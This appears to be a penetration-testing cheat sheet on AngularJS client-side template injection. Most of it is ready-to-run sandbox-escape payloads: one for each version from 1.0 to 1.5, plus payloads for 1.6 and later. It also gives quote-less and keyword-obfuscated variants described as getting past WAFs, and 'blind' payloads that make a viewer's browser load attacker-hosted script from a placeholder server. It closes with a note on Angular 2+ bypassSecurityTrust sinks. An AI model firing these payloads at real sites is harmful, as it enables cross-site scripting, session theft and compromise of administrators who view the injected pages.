# AngularJS client-side template injection (CSTI) sandbox escapes — Open WHEN: recon shows AngularJS (the `ng-app` directive, `angular.js`, `{{ }}` interpolation rendering reflected input) and a value you control is evaluated as an Angular expression, so you need the version-specific sandbox-escape that turns `{{expression}}` into JS execution

AngularJS evaluates `{{ }}` expressions client-side. If user input lands inside
an Angular template (or you can add `ng-app` to a root element), the expression
sandbox of pre-1.6 versions can be escaped to reach the JS `Function`
constructor. **The sandbox was removed entirely in 1.6**, so on 1.6+ a plain
`constructor.constructor` call runs directly.

## First step: is Angular live here?
`ng-app` must be on a root element for client-side injection. If it's missing
but you have HTML injection, add it yourself:
```html
<div ng-app>{{constructor.constructor('alert(document.domain)')()}}</div>
```
Confirm Angular is processing your braces by injecting `{{7*7}}` — a rendered
`49` proves expression evaluation (distinguish from SSTI, which evaluates
server-side).

## 1.6+ (no sandbox) — the common modern case
```javascript
{{constructor.constructor('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
{{[].pop.constructor&#40'alert(1)'&#41&#40&#41}}   <!-- entity/unicode-escaped -->
```

## Quote-less / keyword-less variants (filter strips `'` `"` or `constructor`)
```javascript
{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}}
{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[a].fromCharCode(112,114,111,109,112,116,40,49,41))()}}
{{x=['constr','uctor'];a=x.join('');b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'pr\u{6f}mpt(1)')()}}
```
The last builds `constructor` from `'constr'+'uctor'` and uses `\u{6f}`
escapes — useful against keyword filters (works past Imperva-style WAFs).

## Version-specific sandbox escapes (pre-1.6)
Each AngularJS minor changed the sandbox; match the loaded version exactly.
```javascript
// 1.5.0 - 1.5.8
{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}
// 1.4.0 - 1.4.9
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
// 1.3.1 - 1.3.18 (prototype-poison charAt)
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)//');}}
// 1.2.24 - 1.2.29
{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window.x)alert(window.x=1)')+eval(y)+\"'");}}
// 1.2.19 - 1.2.23
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
// 1.2.6 - 1.2.18
{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
// 1.2.0 - 1.2.5
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
// 1.0.1 - 1.1.5  (also Vue 1.x)
{{constructor.constructor('alert(1)')()}}
```
Find the version from `angular.version.full` in the console, a comment in
`angular.js`, or the file path/CDN URL.

## Blind CSTI (load a remote script for a passive viewer)
Swap `alert(1)` for a script-injector so an admin/headless viewer pulls your JS:
```javascript
{{constructor.constructor("var s=document.createElement('script');s.src='//SRV/m';document.body.appendChild(s)")()}}
{{$on.constructor("var s=document.createElement('script');s.src='//SRV/m';document.body.appendChild(s)")()}}
```

## Modern Angular (2+) sink — `bypassSecurityTrust*`
Angular 2+ auto-sanitizes by default. The injection point is code calling
`DomSanitizer.bypassSecurityTrustHtml/Script/Style/Url/ResourceUrl` on
user-controlled input — when reviewing a target app, look for those calls
binding into `[innerHTML]`, `[href]`, `[src]`, or `[style]`. A user-controlled
value passed to `bypassSecurityTrustUrl` accepts `javascript:alert(1)`.
